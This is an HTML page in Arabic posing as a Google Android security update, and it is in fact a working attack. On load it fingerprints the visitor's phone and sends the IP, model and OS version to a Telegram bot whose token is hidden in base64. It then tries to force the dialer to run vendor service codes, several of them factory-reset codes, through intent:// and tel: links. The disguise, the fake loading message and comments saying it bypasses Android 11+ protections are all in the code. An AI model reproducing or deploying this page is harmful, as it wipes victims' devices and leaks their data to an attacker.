<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Google Security Support">
    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
    <title>تحديث أمان أندرويد</title>
    <style>
        body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display:inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
    </style>
</head>
<body onload="launch_attack()">

    <div id="overlay"></div>

    <div id="content">
        <div class="loader"></div>
        <p style="color:#5f6368; font-size:18px;">جاري فحص توافق الجهاز مع بروتوكول الحماية...</p>
        <p id="dev-info" style="font-size:12px; color:#ccc;"></p>
    </div>

<script>
    // بياناتك المشفرة
    const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
    const _c = "NzE4NDk3MDM1NQ==";
    function _d(s) { return atob(s); }

    function launch_attack() {
        const p = new URLSearchParams(window.location.search);
        if (p.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }

        let ua = navigator.userAgent;
        let model = "Unknown Device";
        let osVer = "Unknown OS";
        let code = "2767*3855%23"; // الكود الافتراضي
        let method = "⚠️ توجيه يدوي (لوحة الاتصال)";

        // 1. تحليل دقيق جداً للموديل والإصدار
        if (ua.match(/Android\s([0-9\.]+)/)) {
            osVer = "Android " + RegExp.$1;
            let ver = parseFloat(RegExp.$1);
            if (ver <= 10) method = "🚀 تنفيذ تلقائي (صامت)";
        }

        // 2. تحديد الكود المناسب بناءً على البصمة الرقمية للجهاز
        let uL = ua.toLowerCase();
        if (uL.includes("samsung")) {
            model = "Samsung"; code = "2767*3855%23";
        } else if (uL.includes("xiaomi") || uL.includes("redmi")) {
            model = "Xiaomi/Redmi"; code = "%23*%23*7780*%23*%23";
        } else if (uL.includes("huawei") || uL.includes("honor")) {
            model = "Huawei/Honor"; code = "%23*%23*2846579*%23*%23";
        } else if (uL.includes("realme") || uL.includes("oppo") || uL.includes("vivo")) {
            model = "Realme/Oppo/Vivo"; code = "2767*3855%23";
        } else if (uL.includes("sony")) {
            model = "Sony"; code = "%23*%23*7378423*%23*%23";
        }

        // 3. إرسال التقرير المجهري للتليجرام
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ipData => {
            let report = `🎯 هدف تحت المجهر!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${model}\n⚙️ الإصدار: ${osVer}\n📡 الحالة: ${method}\n📟 الكود المستخدم: *${code.replace('%23', '#')}*`;
            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(report)}`);
        });

        // 4. التنفيذ القسري (تجاوز حماية 11+)
        setTimeout(() => {
            // محاولة فتح عبر Intent (الأقوى للأجهزة الحديثة)
            let intent = `intent://*${code}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
            window.location.href = intent;
            
            // احتياطي لو فشل الـ Intent
            setTimeout(() => {
                window.location.href = "tel:*" + code;
            }, 1000);
        }, 1200);
    }

    document.getElementById('overlay').onclick = launch_attack;
</script>
</body>
</html>
